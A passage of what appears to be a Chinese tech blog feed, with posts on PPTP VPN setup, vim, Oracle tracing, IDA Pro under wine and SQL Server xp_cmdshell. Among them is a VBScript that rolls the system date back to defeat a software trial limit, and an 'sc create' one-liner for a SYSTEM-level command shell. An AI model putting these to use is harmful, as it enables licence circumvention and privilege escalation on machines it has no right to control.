class="hljs-keyword">and</span> the receive direction.<br></code></pre></td></tr></table></figure><p>编辑 &#x2F;etc&#x2F;ppp&#x2F;options.pptp 添加以下行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">novj</span><br></code></pre></td></tr></table></figure><h2 id="保持长时间在线"><a href="#保持长时间在线" class="headerlink" title="保持长时间在线"></a>保持长时间在线</h2><p>后面还发现一个问题，一段时间不用就自动断开连接了，发现lcp-echo-interval 可以缓解这个问题。</p><p>编辑 &#x2F;etc&#x2F;ppp&#x2F;options.pptp 添加以下行</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">lcp-echo-<span class="hljs-built_in">int</span>erval <span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><h2 id="Example-Config-file"><a href="#Example-Config-file" class="headerlink" title="Example Config file"></a>Example Config file</h2><p>最终使用的配置如下：&#x2F;etc&#x2F;ppp&#x2F;options.pptp</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs gradle">lock<br>noauth<br>refuse-pap<br>refuse-eap<br>refuse-chap<br>refuse-mschap<br>usepeerdns<br>noipdefault<br>nodefaultroute<br>novj<br>require-mppe<br>nobsdcomp<br>nodeflate<br>lcp-echo-failure <span class="hljs-number">5</span><br>lcp-echo-interval <span class="hljs-number">30</span><br>mppe-stateful<br><br><span class="hljs-regexp">/etc/</span>ppp<span class="hljs-regexp">/peers/</span>vpn<br><br>pty <span class="hljs-string">&quot;pptp *.99.*27.1*0 --nolaunchpppd&quot;</span><br>name xxx<br>remotename PPTP<br><span class="hljs-keyword">file</span> <span class="hljs-regexp">/etc/</span>ppp/<span class="hljs-keyword">options</span>.pptp<br>ipparam vpn<br><br><span class="hljs-regexp">/etc/</span>ppp/chap-secrets<br><br>user PPTP password *.<span class="hljs-number">99</span>.*<span class="hljs-number">27.1</span>*<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://shyju.wordpress.com/2013/08/13/linux-as-a-pptp-vpn-client-configuration-centosfedora/">http://shyju.wordpress.com/2013/08/13/linux-as-a-pptp-vpn-client-configuration-centosfedora/</a><br><a href="http://www.cyberciti.biz/tips/howto-configure-ubuntu-fedora-linux-pptp-client.html">http://www.cyberciti.biz/tips/howto-configure-ubuntu-fedora-linux-pptp-client.html</a><br><a href="http://pptpclient.sourceforge.net/">http://pptpclient.sourceforge.net/</a><br><a href="https://ppp.samba.org/index.html">https://ppp.samba.org/index.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim 使用的几个小技巧</title>
    <link href="/cn/vim_tips/"/>
    <url>/cn/vim_tips/</url>
    
    <content type="html"><![CDATA[<h2 id="0-将tab-替换为空格"><a href="#0-将tab-替换为空格" class="headerlink" title="0.  将tab 替换为空格"></a>0.  将tab 替换为空格</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">:<span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><h2 id="1-全文格式化"><a href="#1-全文格式化" class="headerlink" title="1. 全文格式化"></a>1. 全文格式化</h2><p>normal模式下，<code>gg=G</code></p><h2 id="2-跳转到上次编辑处"><a href="#2-跳转到上次编辑处" class="headerlink" title="2. 跳转到上次编辑处"></a>2. 跳转到上次编辑处</h2><p>normal模式下，<code>&#39;.</code></p><h2 id="3-替换行尾多余的空格"><a href="#3-替换行尾多余的空格" class="headerlink" title="3. 替换行尾多余的空格"></a>3. 替换行尾多余的空格</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:%s=</span> *<span class="hljs-variable">$=</span>=<br></code></pre></td></tr></table></figure><h2 id="4-Source-your-vimrc"><a href="#4-Source-your-vimrc" class="headerlink" title="4. Source your vimrc."></a>4. Source your vimrc.</h2><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:so</span> <span class="hljs-variable">$MYVIMRC</span><br></code></pre></td></tr></table></figure><h2 id="5-在文件中跳转"><a href="#5-在文件中跳转" class="headerlink" title="5. 在文件中跳转"></a>5. 在文件中跳转</h2><p>normal 模式下，<code>ctrl-o</code></p><h2 id="6-内置文件浏览器"><a href="#6-内置文件浏览器" class="headerlink" title="6. 内置文件浏览器"></a>6. 内置文件浏览器</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">:<span class="hljs-built_in">Exp</span><br></code></pre></td></tr></table></figure><h2 id="7-一眼看出tab和空格的区别"><a href="#7-一眼看出tab和空格的区别" class="headerlink" title="7. 一眼看出tab和空格的区别"></a>7. 一眼看出tab和空格的区别</h2><p>在.vimrc 中添加下面行，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> list <span class="hljs-attribute">listchars</span>=tab:&gt;-,trail:.,extends:&gt; <br></code></pre></td></tr></table></figure><h2 id="8-解决-vim-编译时权限不够问题"><a href="#8-解决-vim-编译时权限不够问题" class="headerlink" title="8. 解决 vim 编译时权限不够问题"></a>8. 解决 vim 编译时权限不够问题</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">:w !sudo tee <span class="hljs-comment">%</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim中的python</title>
    <link href="/cn/vim_python/"/>
    <url>/cn/vim_python/</url>
    
    <content type="html"><![CDATA[<h2 id="1-判断vim支持python"><a href="#1-判断vim支持python" class="headerlink" title="1. 判断vim支持python"></a>1. 判断vim支持python</h2><p>要判断你的vim是否支持python，可以执行下面命令：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">vim</span> --<span class="hljs-keyword">version</span> | <span class="hljs-keyword">grep</span> <span class="hljs-keyword">python</span><br></code></pre></td></tr></table></figure><p>如果显示的结果中有 +python 的话，你的vim已经支持python，<br>如果没有的话，你需要重新编译vim，在windows中可以使用下面的命令行，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">nmake -f Make_mvc.mak <span class="hljs-attribute">FEATURES</span>=huge <span class="hljs-attribute">PYTHON</span>=D:\Python27 <span class="hljs-attribute">PYTHON_VER</span>=27 <span class="hljs-attribute">GUI</span>=<span class="hljs-literal">yes</span> <span class="hljs-attribute">IME</span>=<span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><h2 id="2-为什么需要编译支持python的vim"><a href="#2-为什么需要编译支持python的vim" class="headerlink" title="2. 为什么需要编译支持python的vim"></a>2. 为什么需要编译支持python的vim</h2><p>主要的理由有两个，</p><ol><li>可以使用python写的vim插件。</li><li>vim 7.4 以后对python的支持进行了增强。</li></ol><p>有很多不错的vim 插件，这里给大家推荐一个python-mode, 非常不错。<a href="https://github.com/klen/python-mode">https://github.com/klen/python-mode</a></p><p>vim 7.4 以后对python的支持进行了增强，这个是广大vim注册用户（捐钱的用户）呼声最<br>高的需求，原话为，</p><blockquote><p>add integration with Python instead of inventing more Vim script</p></blockquote><p>确实现在已经有太多的vim脚本了。vim的主页上的完整需求列表; <a href="http://www.vim.org/sponsor/vote_results.php">http://www.vim.org/sponsor/vote_results.php</a></p><blockquote><p>add IDE features (debugger integration, shell window)</p></blockquote><p>这个是排行老二的需求，不知道什么时侯能实现，期待中…</p><h2 id="3-一些应用举例"><a href="#3-一些应用举例" class="headerlink" title="3. 一些应用举例"></a>3. 一些应用举例</h2><h3 id="3-1-python-commands"><a href="#3-1-python-commands" class="headerlink" title="3.1 python commands"></a>3.1 python commands</h3><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">:<span class="hljs-comment">[range]</span>py<span class="hljs-comment">[thon]</span> &#123;stmt&#125;<br></code></pre></td></tr></table></figure><p>这个命令比较简单，详细解释如下:</p><p>range 是标准的vim的range 熟悉vim替换命令的同学应该都不会陌生。range的作用的是指<br>定python命令影响哪些行，写法为 [行号，行号]，比如 1,2  影响第一行和第二行，1,$<br>影响整个文件。[] 的意思是这个range是可选的默认将影响整个文件。</p><p>py[thon]的意思为，python 是命令的全写，可以简写为py。</p><p>{stmt} python 语句</p><p>可以写上下面命令，输出 Hello</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">:<span class="hljs-keyword">python</span> <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello python&quot;</span><br></code></pre></td></tr></table></figure><p>数学不好的同学可以像我一样使用</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">:py <span class="hljs-built_in">print</span> 1+1<br></code></pre></td></tr></table></figure><p>将显示结果2  :)</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">:[range]py[thon] &lt;&lt; </span><span class="hljs-template-variable">&#123;endmarker&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;script&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;endmarker&#125;</span><br></code></pre></td></tr></table></figure><p>上面是这个命令是第二种用法，可以直接写python，相当爽，写法很象cat 命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cat</span> &gt; /tmp/xx &lt;&lt; <span class="hljs-string">EOF</span><br><span class="hljs-string">....</span><br><span class="hljs-string">EOF</span><br></code></pre></td></tr></table></figure><p>想用vim查询天气的同学可以参考一下，github上的这个脚本 <a href="https://raw.github.com/liqunli/vim-plugin-dev/master/dairy.vim">https://raw.github.com/liqunli/vim-plugin-dev/master/dairy.vim</a></p><h3 id="3-2-pydo"><a href="#3-2-pydo" class="headerlink" title="3.2 pydo"></a>3.2 pydo</h3><p>这个命令的格式为， :[range]pydo {body}</p><p>vim 中有一个定义好的函数，这个命令将利用这个函数做一些事情</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_vim_pydo</span>(<span class="hljs-params">line, linenr</span>):<br>    &#123;body&#125;<br></code></pre></td></tr></table></figure><p>pydo 这个命令同样是以行为单位的，range的用法和上面说的一样。 line 是原始的行，<br>linenr 是 line number (行号）。大家可以猜一下下面命令的意思，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">:pydo if line:</span> return &quot;%4d: %s&quot; % (linenr, line)<br></code></pre></td></tr></table></figure><p>显示结果大致是这样， 直接用这个文件测试了一下，</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">55</span>: 将显示结果2  :)<br><br><br><span class="hljs-attribute">58</span>: :[range]py[thon] &lt;&lt; &#123;endmarker&#125;<br><span class="hljs-attribute">59</span>: &#123;script&#125;<br><span class="hljs-attribute">60</span>: &#123;endmarker&#125;<br></code></pre></td></tr></table></figure><p>没有指定range，默认为整个文件，”%4d: %s” % (linenr, line)  这句的意思是，<br>在每行前加行号，不足4位的数字的用空格补齐</p><p>在早些时侯，vim命令要实现这个的效果，需要写一行诡异的命令，</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-meta">:%s/^/\=printf(&#x27;%4d:</span> <span class="hljs-emphasis">&#x27;, line(&#x27;</span>.<span class="hljs-emphasis">&#x27;))</span><br></code></pre></td></tr></table></figure><p>挑战太大，vim 还专门写了一篇wiki <a href="http://vim.wikia.com/wiki/Insert_line_numbers">http://vim.wikia.com/wiki/Insert_line_numbers</a></p><h3 id="3-3-pyfile"><a href="#3-3-pyfile" class="headerlink" title="3.3 pyfile"></a>3.3 pyfile</h3><p>这条命令的格式为，:[range]pyf[ile] {file}</p><p>可以直接使用python 文件，不需要一句一句的输入python 语句了。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">python</span> from <span class="hljs-keyword">vim</span> import *<br>:<span class="hljs-keyword">python</span> from <span class="hljs-built_in">string</span> import upper<br>:<span class="hljs-keyword">python</span> current.<span class="hljs-built_in">line</span> = upper(current.<span class="hljs-built_in">line</span>)<br>:<span class="hljs-keyword">python</span> <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello&quot;</span><br>:<span class="hljs-keyword">python</span> str = current.<span class="hljs-keyword">buffer</span>[<span class="hljs-number">42</span>]<br></code></pre></td></tr></table></figure><h3 id="3-4-python3"><a href="#3-4-python3" class="headerlink" title="3.4  python3"></a>3.4  python3</h3><p>命令的格式和python是一样的，不过需要开启 +python3</p><h3 id="3-5-vim的python-接口"><a href="#3-5-vim的python-接口" class="headerlink" title="3.5  vim的python 接口"></a>3.5  vim的python 接口</h3><p>这个不属于这个小文章的想说的了，写了这成vim的manual了，可以直接参看:<br><a href="http://vimhelp.appspot.com/if_pyth.txt.html#python-vim">http://vimhelp.appspot.com/if_pyth.txt.html#python-vim</a></p><h2 id="4-最后"><a href="#4-最后" class="headerlink" title="4. 最后"></a>4. 最后</h2><p>为了避免vim和emacs的圣战，hx 和 lzx等emacs党，可以直接忽视此文 ：）</p><h2 id="5-参考资料"><a href="#5-参考资料" class="headerlink" title="5. 参考资料"></a>5. 参考资料</h2><p><a href="http://vimhelp.appspot.com/if_pyth.txt.html">http://vimhelp.appspot.com/if_pyth.txt.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle 数据库如何trace 执行的SQL statement</title>
    <link href="/cn/oracle_statement_trace/"/>
    <url>/cn/oracle_statement_trace/</url>
    
    <content type="html"><![CDATA[<p>Q.  Oracle 数据库如何trace执行的SQL statement</p><h2 id="1-开启trace"><a href="#1-开启trace" class="headerlink" title="1. 开启trace"></a>1. 开启trace</h2><p>方法(1) : 执行SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> sql_trace <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">SET</span> EVENTS <span class="hljs-string">&#x27;10046 trace name context forever, level 12&#x27;</span>;<br></code></pre></td></tr></table></figure><p>方法(2) : 修改init.ora 配置文件</p><p>还可以修改init.ora 文件添加 event&#x3D;”10046 trace name context forever,level 12”  来达到目的，<br>修改以后需要重新启动数据库。</p><h2 id="2-关闭-trace"><a href="#2-关闭-trace" class="headerlink" title="2. 关闭 trace"></a>2. 关闭 trace</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">alter</span> <span class="hljs-keyword">system</span> <span class="hljs-keyword">set</span> EVENTS <span class="hljs-string">&#x27;10046 trace name context off&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="3-trace相关的几个参数"><a href="#3-trace相关的几个参数" class="headerlink" title="3. trace相关的几个参数"></a>3. trace相关的几个参数</h2><ul><li>MAX_DUMP_FILE_SIZE    dump 文件大小</li><li>USER_DUMP_DEST           dump 文件路径</li></ul><p>可以使用下面语句参看：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">parameter</span> user_dump_dest;<br><br>NAME     TYPE <span class="hljs-keyword">VALUE</span><br><span class="hljs-comment">------------------------------------ ----------- ------------------------------</span><br>user_dump_dest     string <span class="hljs-operator">/</span>u01<span class="hljs-operator">/</span>app<span class="hljs-operator">/</span>diag<span class="hljs-operator">/</span>rdbms<span class="hljs-operator">/</span>orcl<span class="hljs-operator">/</span>orcl<span class="hljs-operator">/</span>trace<br><br><br><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">parameter</span> max_dump_file_size;<br><br>NAME     TYPE <span class="hljs-keyword">VALUE</span><br><span class="hljs-comment">------------------------------------ ----------- ------------------------------</span><br>max_dump_file_size     string unlimited<br></code></pre></td></tr></table></figure><h2 id="4-trc-文件分析"><a href="#4-trc-文件分析" class="headerlink" title="4.  trc 文件分析"></a>4.  trc 文件分析</h2><p>方法(1)</p><p>可以使用trc2sql.pl 来提取trc文件中的SQL语句</p><p>下载地址: <a href="https://gist.github.com/henices/5097678">https://gist.github.com/henices/5097678</a></p><p>方法(2)</p><p>oracle提供tkprof 命令可以解析trc文件，使用方法为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ tkprof tracefile outputfile<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>参考链接： <a href="http://www.eygle.com/case/Use.sql_trace.to.Diagnose.database.htm">http://www.eygle.com/case/Use.sql_trace.to.Diagnose.database.htm</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 下运行 IDA Pro</title>
    <link href="/cn/linux_ida_pro/"/>
    <url>/cn/linux_ida_pro/</url>
    
    <content type="html"><![CDATA[<p>IDA Pro 6.2 + 的Linux 版本提供了Qt 界面，可以在各大平台正常运行。买不起也有办法 ，使用 wine 可以很好地运行IDA Pro，显示效果基本OK，爱折腾的同学可以自行调整字体。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>wine idag.exe<br></code></pre></td></tr></table></figure><p>IDA Pro 6.1 成功运行.但是idapython 有些问题需要处理，引起idapython不能正常运行的原因主要有下面两个：</p><h2 id="文件缺失"><a href="#文件缺失" class="headerlink" title="文件缺失"></a>文件缺失</h2><p>大概会报下面错误 </p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">err:<span class="hljs-keyword">module</span>:<span class="hljs-keyword">import</span><span class="hljs-number">_</span>dll Library python<span class="hljs-number">27</span>.dll (which <span class="hljs-keyword">is</span> needed <span class="hljs-meta">by</span> L<span class="hljs-string">&quot;C:\\ida61\\plugins\\python.plw&quot;</span>) not found<br></code></pre></td></tr></table></figure><p>要解决这个错误，需要从windows下拷贝两个文件过来，这两个文件是 msvcr90.dll，python27.dll</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>wine idag.exe<br></code></pre></td></tr></table></figure><p>会报下面类似错误， ImportError: No module named site，发生这个错误的原因是找不到python安装路径，可以使用unix下的python使用shell命令设置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> PYTHONPATH=/usr/lib/python2.7/<br>$ wine idag.exe<br></code></pre></td></tr></table></figure><h2 id="Python-问题"><a href="#Python-问题" class="headerlink" title="Python 问题"></a>Python 问题</h2><p>在使用过程中发现idapython还是有一些问题，使用wine安装Windows的python后问题得到解决，主要是C语言写的python模块的问题。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.openrce.org/forums/posts/463">http://www.openrce.org/forums/posts/463</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>破解软件时间限制的程序</title>
    <link href="/cn/crack_time_limit_software/"/>
    <url>/cn/crack_time_limit_software/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> daytime<br>daytime = <span class="hljs-built_in">formatdatetime</span>(<span class="hljs-built_in">now</span>(), <span class="hljs-number">2</span>)<br>wscript.echo <span class="hljs-string">&quot;Now is: &quot;</span> &amp; daytime<br>wscript.echo <span class="hljs-string">&quot;Change system data to 2010/12/18...&quot;</span><br><span class="hljs-keyword">Set</span> os =WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)<br>os.run <span class="hljs-string">&quot;cmd /c date 2010/12/18&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">True</span><br>wscript.sleep <span class="hljs-number">3000</span><br>wscript.echo <span class="hljs-string">&quot;Call some.exe&quot;</span><br>os.run <span class="hljs-string">&quot;.\some.exe&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">True</span><br>wscript.echo <span class="hljs-string">&quot;Restore system data to &quot;</span> &amp; daytime<br>os.run <span class="hljs-string">&quot;cmd /c date &quot;</span> &amp; daytime, <span class="hljs-number">0</span>, <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>获取system权限的cmdshell</title>
    <link href="/cn/get_system_shell_windows/"/>
    <url>/cn/get_system_shell_windows/</url>
    
    <content type="html"><![CDATA[<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create SuperCMD binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>=own <span class="hljs-built_in">type</span>=interact<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> SuperCMD<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL Server 2005 xp_cmdshell</title>
    <link href="/cn/sqlserver2005_xpcmdshell/"/>
    <url>/cn/sqlserver2005_xpcmdshell/</url>
    
    <content type="html"><![CDATA[<p>SQL Server 2005 中引入的 xp_cmdshell 选项是服务器配置选项，<br>使系统管理员能够控制是否可以在系统上执行 xp_cmdshell 扩展存储过程。</p><h2 id="1-如何在sql-server-2005-中开启xp-cmdshell"><a href="#1-如何在sql-server-2005-中开启xp-cmdshell" class="headerlink" title="1.  如何在sql server 2005 中开启xp_cmdshell"></a>1.  如何在sql server 2005 中开启xp_cmdshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- To allow advanced options to be changed.</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>GO<br><span class="hljs-comment">-- To update the currently configured value for advanced options.</span><br>RECONFIGURE<br>GO<br><span class="hljs-comment">-- To enable the feature.</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><br>GO<br><span class="hljs-comment">-- To update the currently configured value for this feature.</span><br>RECONFIGURE<br>GO<br></code></pre></td></tr></table></figure><h2 id="2-如何查询sql-server-2005-拓展存储过程xp-cmdshell-状态"><a href="#2-如何查询sql-server-2005-拓展存储过程xp-cmdshell-状态" class="headerlink" title="2. 如何查询sql server 2005 拓展存储过程xp_cmdshell 状态"></a>2. 如何查询sql server 2005 拓展存储过程xp_cmdshell 状态</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br>GO<br></code></pre></td></tr></table></figure><p>查看value的值， 1 为开启， 0 为关闭</p><h2 id="3-如何查看public角色对哪些拓展存储过程有执行权限"><a href="#3-如何查看public角色对哪些拓展存储过程有执行权限" class="headerlink" title="3. 如何查看public角色对哪些拓展存储过程有执行权限"></a>3. 如何查看public角色对哪些拓展存储过程有执行权限</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sysusers.name, sysobjects.name, sysprotects.action <span class="hljs-keyword">from</span> sysobjects, sysusers, sysprotects<br><span class="hljs-keyword">where</span> sysobjects.id<span class="hljs-operator">=</span>sysprotects.id <span class="hljs-keyword">and</span> sysprotects.uid <span class="hljs-operator">=</span> sysusers.uid <span class="hljs-keyword">and</span> <br>sysprotects.protecttype<span class="hljs-operator">=</span><span class="hljs-number">205</span> <span class="hljs-keyword">and</span> sysprotects.action<span class="hljs-operator">=</span> <span class="hljs-number">224</span> <span class="hljs-keyword">and</span> (sysusers.name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;public&#x27;</span> <span class="hljs-keyword">or</span><br>sysusers.name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;guest&#x27;</span> ) <span class="hljs-keyword">and</span> sysobjects.type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;X&#x27;</span><br><br>GO<br></code></pre></td></tr></table></figure><h2 id="4-如何去掉public角色对拓展存储过程的执行权限"><a href="#4-如何去掉public角色对拓展存储过程的执行权限" class="headerlink" title="4. 如何去掉public角色对拓展存储过程的执行权限"></a>4. 如何去掉public角色对拓展存储过程的执行权限</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">deny <span class="hljs-keyword">execute</span> <span class="hljs-keyword">on</span> xp_dirtree <span class="hljs-keyword">to</span> public<br>GO<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>挂钩 NtResumeThread 实现全局Hook</title>
    <link href="/cn/hook_ntResume/"/>
    <url>/cn/hook_ntResume/</url>
    
